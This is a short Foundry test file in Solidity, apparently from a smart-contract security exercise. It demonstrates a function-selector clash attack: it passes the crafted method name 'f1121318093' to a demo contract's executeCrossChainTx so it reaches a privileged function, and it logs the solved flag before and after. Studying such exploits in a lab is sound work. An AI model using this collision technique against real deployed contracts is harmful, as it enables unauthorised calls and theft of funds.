// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {SelectorClash} from "../../src/Selector/SelectorClash.sol";

contract SelectorClashTest is Test {
    SelectorClash public selectorClash;

    function setUp() public {
        selectorClash = new SelectorClash();
    }
    function testSelectorClash() public {
        bytes memory _method = bytes("f1121318093");
        
        console.log("selectorClash.solved() before attack: ", selectorClash.solved());
        selectorClash.executeCrossChainTx(_method, abi.encodePacked(), abi.encodePacked(), 0);
        console.log("selectorClash.solved() after attack: ", selectorClash.solved());

    }
}
